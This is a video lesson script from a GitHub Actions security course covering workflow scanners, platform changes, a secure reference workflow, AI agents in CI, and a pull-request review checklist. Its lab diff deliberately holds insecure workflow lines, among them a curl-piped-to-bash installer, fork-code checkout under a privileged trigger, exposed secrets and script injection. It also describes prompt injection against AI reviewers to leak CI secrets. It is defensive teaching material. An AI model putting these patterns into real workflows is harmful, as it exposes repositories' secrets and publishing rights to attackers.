# V161: Static analysis of workflows, the platform changes of 2025 and 2026, workflow 12, AI agents in workflows, and a review checklist

- **Part.** 7: Security
- **Module.** 29
- **Planned minutes.** 26
- **Prerequisites.** V160
- **Textbook sections.** [Chapter 21A](../../textbook/ch21a-actions-security.md), sections 21A.14 to 21A.17 and 21A.19 to 21A.22
- **Demo scripts.** `labs/ch21a/workflow-audit.sh` on [`workflows/12-secure.yml`](../../workflows/12-secure.yml); `labs/ch21a/lab-29-3-review.sh`; a screen walkthrough of Lab 29.3 in [`lab-manual/m29-actions-security.md`](../../lab-manual/m29-actions-security.md)

## HOOK

**[ON SCREEN]** A pull request description, from the lab:

"Contributors from forks could not see coverage on their pull requests because the token is missing there. This switches CI to the trigger that has secrets, adds the coverage uploader and a comment, moves CI to our own runner to save minutes, and adds a release workflow that publishes to PyPI on a version tag."

Read it again as a reviewer. It is friendly. It solves a real problem. It saves money. Every clause of it describes something this part of the course has taught you to look at twice.

The diff is 34 added lines in two files. Your teammate is waiting for an approval. What do you write, in what order, and how do you make sure you have not missed the one line that matters? You need a checklist, and you need to know what the tools will and will not find for you.

## INTRODUCTION

This video turns Module 29 into practice. The last five videos gave you five attack classes and the controls for each. Here they come together, in a file and in a procedure.

Five topics. Static analysis: what scanners find in workflow files, and what they cannot know. The platform changes of 2025 and 2026, as one dated list. Workflow 12, the course's secure-by-default workflow, read with five questions that `grep` can answer for any workflow. AI agents inside workflows, as the section gives the risks. And the review checklist of section 21A.19: eleven items for every pull request that touches a workflow.

The demonstration audits workflow 12 and then opens the pull request from the hook. That pull request is constructed for the exercise: the action and the host it names do not exist.

## LEARNING OBJECTIVES

After this video you can:

- say what static analysis of workflows finds and what it cannot;
- state the platform changes of 2025 and 2026 that the section lists;
- justify every control of workflow 12;
- state the risks of an AI agent inside a workflow as the section gives them;
- review a pull request that changes workflows with the checklist.

## CONCEPT

**[ON SCREEN]** Lower third: GitHub Actions.

**Static analysis.** Four tools, from the table of section 21A.14.

CodeQL for workflows is part of GitHub code scanning. It has been generally available since 22 April 2025, and default setup enables it when workflow files exist on the default branch. It finds, in the changelog's words, "missing required permissions, dangerous inputs without proper validation, and script injection vulnerabilities", and since CodeQL 2.26.4 also mutable references to reusable workflows.

zizmor is a third-party tool; version 1.30.1 was observed on 1 October 2026. Its audits have names you will recognize from this module: template injection, dangerous triggers, excessive permissions, unpinned uses, cache poisoning, overprovisioned secrets, secrets inherit, self-hosted runner, Dependabot cooldown, and others.

actionlint is a third-party tool; version 1.7.12. Syntax and expression type checks, shellcheck integration, and script injection by untrusted inputs and hard-coded credentials.

OpenSSF Scorecard is a third-party tool whose results can surface in code scanning, with the checks Dangerous-Workflow, Token-Permissions and Pinned-Dependencies.

Neither zizmor nor actionlint is installed in the course's environment, so no output is shown. And the textbook gives the limit in one sentence: a scanner finds patterns; it does not know which of your jobs holds the credential that matters. Its advice: run one in CI as a required check, and still read the file.

**The platform changes of 2025 and 2026.** One caution first, in the textbook's words. The dates are sourced. Pairing each change with an incident is the researchers' inference, not GitHub's statement; GitHub's changelog posts do not name the incidents.

**[ON SCREEN]** The table of section 21A.15, row by row.

22 April 2025: CodeQL analysis of workflow files generally available. 15 August 2025: the allowed-actions policy can block entries and require full commit pins. 28 October 2025: immutable releases generally available. 8 December 2025: `pull_request_target` always uses the workflow from the default branch, and environment branch rules follow the execution ref. 5 February 2026: action allow-listing on all plans. 23 April and 15 July 2026: immutable OIDC subject claims, opt-in and then default for new repositories. 18 June and 20 July 2026: the checkout action at version 7 refuses fork pull request code under privileged triggers, then back-ported. 26 June 2026: a read-only default-branch cache for low-trust triggers. 14 July 2026: a default cooldown for Dependabot version updates. 28 July 2026: runs "identified as potentially malicious" are held until a collaborator with write access approves them, in public repositories only, with no configuration. 10 September 2026: `cache-mode`. 17 September 2026: workflow execution protections generally available. And 2 November 2026: the date GitHub announced for enforcing the default rule that disables `pull_request_target` in affected public repositories; check the changelog on the day you watch this.

**[ON SCREEN]** Callout: Unverified. The heuristics behind the holds on suspicious runs are not documented. Do not count on them as a control.

You have met every row but one in the last five videos. Seen as one list, it says something about direction: the platform is moving defaults toward what this module teaches. And about a limit: each row has a "does not cover", and none of them reads your file for you.

**Workflow 12.** The file puts the controls in one place: a test job, a job that reads the pull request title, a dependency review, and a staging deployment through OIDC. It was assembled from documented syntax and input names and parse-checked. It was not executed on GitHub by the author; Lab 29.2 has you run it.

The textbook reads it with five questions, which `grep` can answer for any workflow. Which events start it? What may the token do? Whose code runs, and is every reference a full commit ID? Where does an expression appear, and is any of them inside a script? Which stored secrets does it read? You will run all five in a moment.

Then the controls, each with the threat it answers.

**[ON SCREEN]** The control table of section 21A.16.

`permissions: contents: read` at the top, an empty map for the title job, and per-job additions below: against a compromised step using a write token.

`on: pull_request`: against fork code running next to secrets.

Every `uses` is a commit ID with a version comment: against a moved tag.

`persist-credentials: false` on every checkout: against later steps using the token through Git.

The title only under `env`: against script injection.

The deployment `if` requires a push to `main`: against unreviewed code reaching the cloud identity.

`environment: staging`: against a deployment without the environment's rules; it also fixes the OIDC subject.

`id-token: write` on one job only: against any other job requesting a cloud token.

`cache-mode: none` on the deployment job: against a poisoned cache executing next to the cloud identity.

`timeout-minutes` and `concurrency`: against runaway or overlapping runs.

And what the file does not do, which the textbook lists as carefully as what it does. It does not attest the build. It does not scan itself; add CodeQL default setup for that. And the staging role's trust policy lives in the cloud account, where the workflow cannot enforce it.

**AI agents inside workflows.** An agent in a workflow, whether an LLM reviewer, a triage bot or a coding agent, combines parts three and four of the model in a new form. It reads attacker-controlled text and holds credentials. And for an agent, text is instruction. The textbook's sentence: no `env` trick separates data from code in a prompt.

Two findings from the report, with their flags. An automated account ran a week-long campaign in February and March 2026 that combined `pull_request_target` abuse, branch-name and filename injection, and prompt injection against an AI reviewer. And researchers reported in April 2026 that AI coding agents run as GitHub Actions could be steered by text in pull request titles, issue bodies or comments into revealing CI secrets. The textbook marks the second: this is secondary reporting only, and the primary write-up was not fetched.

The report's recommendation, which it labels as an inference: an agent in a workflow gets a dedicated low-privilege, spend-capped key; no write token unless required; and it does not run automatically on untrusted contributions. And the chapter's own formulation, which is the one to remember: give the agent's job `permissions` as if the pull request author had written the job, because through the prompt they partly did.

**The review checklist.** Use it on every pull request that touches `.github/workflows/`, an action definition, or a script that a workflow runs. Eleven items.

**[ON SCREEN]** The checklist of section 21A.19, one item at a time.

One, trigger. Does the change add or keep `pull_request_target`, `workflow_run`, `issue_comment`, `issues` or `discussion`? If so, which outsider-controlled input reaches the job?

Two, checkout. Any `ref` or `repository` taken from the event? Any `allow-unsafe-pr-checkout`? Any `git fetch` or `gh pr checkout` of pull request code in a privileged job?

Three, permissions. Is there a top-level `permissions` block, read-only? Is each write scope on the one job that needs it? Did the change widen anything?

Four, expressions. Is there any expression inside `run`, or inside an input that is evaluated as code? Including multi-line scripts?

Five, actions. Is every `uses` a 40-character commit ID from the action's own repository, with a version comment? Is a new action necessary, and who maintains it?

Six, remote code. Any download piped into a shell, or an installer fetched without a checksum?

Seven, secrets. Is each secret referenced in the narrowest place: one step, in a job behind an environment? Could OIDC replace it? Does any secret appear on a command line?

Eight, privileged jobs. For each job that publishes, deploys or holds `id-token: write`: does it run only on trusted refs, behind an environment, with `cache-mode` set to `none` or `read`, and with no artifact from an untrusted run executed?

Nine, runner. Did `runs-on` change to a self-hosted label? For which events?

Ten, credentials in Git. `persist-credentials: false` wherever the job does not push?

Eleven, process. Was the change reviewed by a code owner of the workflows directory, and does a ruleset require that? Does a workflow scanner run on the pull request?

## MENTAL MODEL

Hold workflow 12 as a reference shape, and review other workflows as differences from it.

The shape has two zones. An open zone, where outsiders' code and text are allowed in: the test job, the title job, the dependency review. In that zone the token is read-only or absent, there are no secrets, and untrusted text is only ever data. And a closed zone, the deployment job, where an identity lives. Nothing from outside gets in: only a push to `main`, behind an environment, with no cache.

Every item of the checklist asks one of two things. Did this change let something from outside into the closed zone? Or did it move something valuable into the open zone?

Where the model needs a warning, and the textbook gives it in section 21A.21: the edge case behind most incidents is two safe-looking workflows that share something. A low-privilege workflow that can write a cache, an artifact, a label or a branch, and a high-privilege workflow that trusts it. So the zones are not per file. Review workflows as a set.

## DIAGRAM

**[DIAGRAM]** Workflow 12 as an outline. Draw the file's skeleton first, then add one bracket at a time on the right, each labelled with the attack class it answers.

```text
  on: pull_request, push to main                      ]  fork code never runs next to secrets
  permissions: contents: read                         ]  a compromised step with a write token
  concurrency: ...                                    ]  overlapping runs

  jobs:
    test:                         timeout-minutes     ]  runaway runs
      uses: checkout@<commit ID>                      ]  a moved tag
        persist-credentials: false                    ]  later steps using the token through Git
      uses: setup-uv@<commit ID>
      run: uv sync --locked / ruff / pytest

    pr-metadata:   permissions: {}                    ]  a job that needs no access gets none
      env: PR_TITLE: ${{ ...title }}                  ]  script injection
      run: (a constant script that reads "$PR_TITLE")

    dependency-review:  permissions: contents: read

    deploy-staging:
      if: push && refs/heads/main && ...              ]  unreviewed code reaching the identity
      environment: staging                            ]  a deployment without rules; fixes the OIDC subject
      permissions: contents: read, id-token: write    ]  any other job requesting a cloud token
      cache-mode: none                                ]  a poisoned cache next to the identity
      uses: configure-aws-credentials@<commit ID>     ]  no stored cloud key
```

**[DIAGRAM]** Above the deploy job is the open zone. The deploy job is the closed zone. Count the brackets on it: five, and each closes one road in.

## LIVE TERMINAL DEMO

**[TERMINAL]** Replay with `labs/run ch21a/workflow-audit`. The five questions, asked of workflow 12 with `grep`. Every command reads. 🟢 SAFE.

**Questions 1 and 2: which events start it, and what may the token do?**

```bash
grep -n -A4 '^on:' 12-secure.yml
grep -n -A2 'permissions:' 12-secure.yml
```

<!-- snippet: ch21a/workflow-audit/01-trigger-permissions -->
```text
# Question 1: which events start it? Question 2: what may the token do?
$ grep -n -A4 '^on:' 12-secure.yml
15:on:
16-  pull_request:
17-  push:
18-    branches: [main]
19-
$ grep -n -A2 'permissions:' 12-secure.yml
21:permissions:
22-  contents: read
23-
--
60:    permissions: {}
61-    steps:
62-      - name: Title must not be empty or longer than 72 characters
--
80:    permissions:
81-      contents: read
82-    steps:
--
104:    permissions:
105-      contents: read
106-      id-token: write
```
<!-- /snippet -->

`pull_request`, not the privileged trigger: fork code runs without secrets. Then four `permissions` blocks. At line 21 the workflow token is read-only. At line 60 the title job has an empty map: nothing at all. At line 104 the deployment job adds `id-token: write`, and it is the only one that does.

**Question 3: whose code runs?**

```bash
grep -n 'uses:' 12-secure.yml
grep -n 'uses:' 12-secure.yml | grep -vE '@[0-9a-f]{40}( |$)'
```

<!-- snippet: ch21a/workflow-audit/02-uses -->
```text
# Question 3: whose code runs, and is every reference a full commit ID?
$ grep -n 'uses:' 12-secure.yml
37:        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
43:        uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
84:        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
89:        uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
114:        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
120:        uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
# References that are not 40 hexadecimal characters (no output means none):
$ grep -n 'uses:' 12-secure.yml | grep -vE '@[0-9a-f]{40}( |$)'
[exit status: 1]
```
<!-- /snippet -->

Six references, six commit IDs, all from the pin file. Exit status 1 from the second command means that `grep -v` found nothing to print: no reference that is not forty hexadecimal characters.

**Question 4: where does an expression appear?**

```bash
grep -n '${{' 12-secure.yml
```

**[PAUSE]** Eight lines will appear. Classify each by where the value lands: evaluated by Actions and never reaching a shell; an action input; or text for a script. And which one carries an outsider's text?

<!-- snippet: ch21a/workflow-audit/03-expressions -->
```text
# Question 4: where does an expression appear, and is any of them inside a script?
$ grep -n '${{' 12-secure.yml
26:  group: ${{ github.workflow }}-${{ github.ref }}
27:  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
56:    if: ${{ github.event_name == 'pull_request' }}
66:          PR_TITLE: ${{ github.event.pull_request.title }}
77:    if: ${{ github.event_name == 'pull_request' }}
96:    if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' && vars.AWS_ROLE_ARN != '' }}
122:          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
123:          aws-region: ${{ vars.AWS_REGION }}
```
<!-- /snippet -->

Lines 26, 27, 56, 77 and 96 are a concurrency group and `if` conditions: evaluated by Actions, never reaching a shell. Lines 122 and 123 are action inputs taken from repository variables, which only people with repository access set. Line 66 is the one untrusted value, the pull request title, and it sits under `env`. No expression appears inside a script.

**Question 5: which stored secrets does it read?**

```bash
grep -n 'secrets\.' 12-secure.yml
grep -n -B1 -A1 'id-token' 12-secure.yml
```

<!-- snippet: ch21a/workflow-audit/04-secrets -->
```text
# Question 5: which stored secrets does it read? (no output means none)
$ grep -n 'secrets\.' 12-secure.yml
[exit status: 1]
$ grep -n -B1 -A1 'id-token' 12-secure.yml
105-      contents: read
106:      id-token: write
107-    # Control 8: a job that holds a cloud identity neither restores nor saves a cache.
```
<!-- /snippet -->

None: exit status 1. The workflow reads no stored secret. Its only credential beyond the job token is the OIDC token of the deployment job.

Five questions, about a minute. Now use the same eyes on a file that is not secure by default.

**The review.** Replay `labs/run ch21a/lab-29-3-review`. A repository with a sound `ci.yml` on `main`, and a branch by a teammate with the description you read in the hook.

```bash
git log --oneline --format="%h %an: %s" main..feature/coverage-comment
git diff --stat main...feature/coverage-comment
```

<!-- snippet: ch21a/lab-29-3-review/01-overview -->
```text
$ git log --oneline --format="%h %an: %s" main..feature/coverage-comment
4b55a46 Ravi Menon: Post coverage comments on fork pull requests; add release workflow
$ git diff --stat main...feature/coverage-comment
 .github/workflows/ci.yml      | 22 +++++++++++++++++-----
 .github/workflows/release.yml | 17 +++++++++++++++++
 2 files changed, 34 insertions(+), 5 deletions(-)
```
<!-- /snippet -->

One commit, `4b55a46`, by Ravi. Two files: `ci.yml` changed, `release.yml` new.

```bash
git diff main...feature/coverage-comment -- .github/workflows/ci.yml
```

**[PAUSE]** Hold the checklist beside the diff. Do not look for "the bug". Go through the items in order, one to eleven, and for each ask whether this diff touches it. How many items does this one file touch?

<!-- snippet: ch21a/lab-29-3-review/02-diff-ci -->
```text
$ git diff main...feature/coverage-comment -- .github/workflows/ci.yml
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index ed885e4..ee07560 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1,21 +1,33 @@
 name: ci
 
 on:
-  pull_request:
+  pull_request_target:
   push:
     branches: [main]
 
 permissions:
-  contents: read
+  contents: write
+  pull-requests: write
+
+env:
+  COVERAGE_TOKEN: ${{ secrets.COVERAGE_TOKEN }}
+  PYPI_API_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
 
 jobs:
   test:
-    runs-on: ubuntu-24.04
-    timeout-minutes: 15
+    runs-on: [self-hosted, linux]
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
-          persist-credentials: false
+          ref: ${{ github.event.pull_request.head.sha }}
+          allow-unsafe-pr-checkout: true
       - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
       - run: uv sync --locked
       - run: uv run pytest
+      - name: Install the coverage uploader
+        run: curl -sSL https://coverage-tool.example.com/install.sh | bash
+      - name: Announce
+        run: echo "Coverage for ${{ github.head_ref }} uploaded"
+      - uses: example-org/coverage-comment@v3
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
```
<!-- /snippet -->

I will not give you the findings; they are the lab. But I will show you how to read. Take the first hunk line by line and name the checklist item for each changed line, without judging yet. The trigger line: item one. The `permissions` lines: item three. The new `env` block at workflow level: item seven. `runs-on`: item nine, and notice which line disappeared next to it. The lines under the checkout: items two and ten. Then the added steps at the bottom: there are three, and they belong to three different items.

Notice also what a diff hides. The lines that did not change are still in the file, and their meaning has changed because the trigger above them changed. `uv sync --locked` and `uv run pytest` were harmless yesterday. Ask item two's question about them today. That is why the lab has you read the new files whole with `git show`.

```bash
git diff main...feature/coverage-comment -- .github/workflows/release.yml
```

<!-- snippet: ch21a/lab-29-3-review/03-diff-release -->
```text
$ git diff main...feature/coverage-comment -- .github/workflows/release.yml
diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml
new file mode 100644
index 0000000..bc9f3ce
--- /dev/null
+++ b/.github/workflows/release.yml
@@ -0,0 +1,17 @@
+name: release
+
+on:
+  push:
+    tags: ["v*"]
+
+jobs:
+  publish:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v7
+      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
+        with:
+          enable-cache: true
+      - run: uv build
+      - name: Publish
+        run: uv publish --token "${{ secrets.PYPI_API_TOKEN }}"
```
<!-- /snippet -->

A new file of seventeen lines. For a new file, start with what is absent. Run the five questions in your head: trigger, permissions, references, expressions, secrets. One of the five has no line in this file at all. Then item eight, because this is a job that publishes.

```bash
git grep -n -E "pull_request_target|allow-unsafe|self-hosted|\| bash|@v[0-9]|secrets\.|write" feature/coverage-comment -- .github/workflows
```

`git grep` with a branch name searches the files as they are on that branch, without checking it out.

<!-- snippet: ch21a/lab-29-3-review/04-added-lines -->
```text
# The branch versions of both files, searched for the patterns of the checklist.
$ git grep -n -E "pull_request_target|allow-unsafe|self-hosted|\| bash|@v[0-9]|secrets\.|write" feature/coverage-comment -- .github/workflows
feature/coverage-comment:.github/workflows/ci.yml:4:  pull_request_target:
feature/coverage-comment:.github/workflows/ci.yml:9:  contents: write
feature/coverage-comment:.github/workflows/ci.yml:10:  pull-requests: write
feature/coverage-comment:.github/workflows/ci.yml:13:  COVERAGE_TOKEN: ${{ secrets.COVERAGE_TOKEN }}
feature/coverage-comment:.github/workflows/ci.yml:14:  PYPI_API_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
feature/coverage-comment:.github/workflows/ci.yml:18:    runs-on: [self-hosted, linux]
feature/coverage-comment:.github/workflows/ci.yml:23:          allow-unsafe-pr-checkout: true
feature/coverage-comment:.github/workflows/ci.yml:28:        run: curl -sSL https://coverage-tool.example.com/install.sh | bash
feature/coverage-comment:.github/workflows/ci.yml:31:      - uses: example-org/coverage-comment@v3
feature/coverage-comment:.github/workflows/ci.yml:33:          token: ${{ secrets.GITHUB_TOKEN }}
feature/coverage-comment:.github/workflows/release.yml:11:      - uses: actions/checkout@v7
feature/coverage-comment:.github/workflows/release.yml:17:        run: uv publish --token "${{ secrets.PYPI_API_TOKEN }}"
```
<!-- /snippet -->

Twelve lines from one pattern search. This is the scanner's view: places to look. It found the patterns it was given. It did not find the missing lines, and it does not know which job holds the credential that matters.

**One more thing a reviewer must get right: the base.**

<!-- snippet: ch21a/lab-29-3-review/05-wrong-base -->
```text
# Two dots compare the tips. After main moves, the same command shows changes the author never made.
$ git diff --stat main..feature/coverage-comment
 .github/workflows/ci.yml      | 22 +++++++++++++++++-----
 .github/workflows/release.yml | 17 +++++++++++++++++
 README.md                     |  2 --
 3 files changed, 34 insertions(+), 7 deletions(-)
# Three dots compare the branch with the merge base, as the pull request page does.
$ git diff --stat main...feature/coverage-comment
 .github/workflows/ci.yml      | 22 +++++++++++++++++-----
 .github/workflows/release.yml | 17 +++++++++++++++++
 2 files changed, 34 insertions(+), 5 deletions(-)
```
<!-- /snippet -->

With two dots, the stat shows a third file, `README.md`, with two deletions the author never made: `main` moved after the branch was created. With three dots you see the branch against its merge base, as the pull request page does. Review the three-dot diff, or you will comment on changes that are not in the pull request.

**[ON SCREEN]** Lower third: GitHub. Screen walkthrough.

Lab 29.3 is done in the lab shell; its product is a file, `review.md`. If you then want to practise the form on GitHub, open any pull request on your own practice repository that changes a workflow, for example the one from Lab 29.2. The interface changes; name what you see by function. Find where a comment is attached to a single line of the diff, and where the overall verdict is chosen: approve, comment, or request changes. `gh pr checkout` gives you the branch locally; the textbook labels it 🟢 SAFE, since it changes local files and refs only. And remember from the checklist that the same command is a finding when it appears inside a privileged workflow.

## COMMON MISTAKES

1. **Treating a green scanner as a review.** Root cause: a scanner finds patterns; it does not know which job holds the credential that matters, and it does not find lines that are missing.
2. **Reviewing only the changed lines.** Root cause: an unchanged step means something else after the trigger above it changed; read the new file whole.
3. **Reviewing one workflow at a time.** Root cause: most incidents involve two safe-looking workflows that share a cache, an artifact, a label or a branch.
4. **Giving an agent's job the permissions the team would have.** Root cause: the agent reads attacker-controlled text, and for an agent text is instruction; through the prompt the pull request author partly wrote the job.
5. **Reading a two-dot diff of the pull request.** Root cause: two dots compare the tips, so changes made on the base branch appear as if the author had made them.

## PRODUCTION EXAMPLE

A team adds an LLM reviewer to its repository of evaluation code. The workflow runs on pull requests, gives the agent the diff and the description, and lets it post a review. To post, it needs a write scope, and to call the model it needs an API key. The first version runs on every pull request, including those from forks, on the privileged trigger so that the key is available.

Run the checklist. Item one: a privileged trigger, and the outsider-controlled input is the entire content of the pull request, handed to the agent as text. Item seven: a provider key in a job that reads that text. Item three: a write scope in the same job.

The textbook's recommendation applies point by point. A dedicated low-privilege, spend-capped key, so that a leak is bounded. No write token unless required: for example, the agent writes its review to the job summary, and a separate job without the model key posts it. And it does not run automatically on untrusted contributions: a maintainer starts it for a fork's pull request after reading the change.

The team's rule afterwards is the chapter's sentence, pinned in the repository: give the agent's job `permissions` as if the pull request author had written the job.

## PRACTICE EXERCISE

Do Lab 29.3, "Review a pull request that changes workflows", in [`lab-manual/m29-actions-security.md`](../../lab-manual/m29-actions-security.md), in `labs/shell`.

Write `review.md`: one comment per finding, each with the file and line, a severity, what the line does, what an attacker could achieve, and the requested change. Before you start, predict how many findings there are, and afterwards compare. Finish with a verdict and a two-sentence summary for the author that is specific and not hostile: they were solving a real problem.

The challenge is Exercise 29.7, "Benchmark scores on fork pull requests", in [`exercises/m26-m31-actions-security.md`](../../exercises/m26-m31-actions-security.md).

## INTERVIEW QUESTION

**[ON SCREEN]** Q319: "How do you secure GitHub Actions?"

This is the broadest question of the module, and a weak answer is a list of settings. A strong answer starts from the one question, whose code, whose text, what can it reach, and organizes the controls by the five parts of the model, with one sentence each on the threat it answers. It separates what is in the file from what is in settings, and names the process control that protects the files themselves. It says what remains outside: what a scanner cannot know, and what lives in the cloud account. The follow-up asks which controls the platform can enforce for you and which still depend on a person reading the file; you have the policy table and the checklist to divide them.

## RECAP

You should now be able to say:

- A scanner finds patterns in workflow files; it does not know which job holds the credential that matters, so you run one and still read the file.
- From 2025 to 2026 the platform moved its defaults toward these controls, with 2 November 2026 as the next announced date; each change has something it does not cover.
- Workflow 12 keeps outsiders' code and text in jobs without privilege, and keeps its one identity in a job that only trusted code can reach, behind an environment, without a cache.
- An agent in a workflow reads attacker-controlled text and holds credentials; give its job permissions as if the pull request author had written it.
- The checklist has eleven items: trigger, checkout, permissions, expressions, actions, remote code, secrets, privileged jobs, runner, credentials in Git, process.

## HOMEWORK

Read sections 21A.14 to 21A.17 and 21A.19 to 21A.22 of [Chapter 21A](../../textbook/ch21a-actions-security.md). Do the Practice section 21A.24.
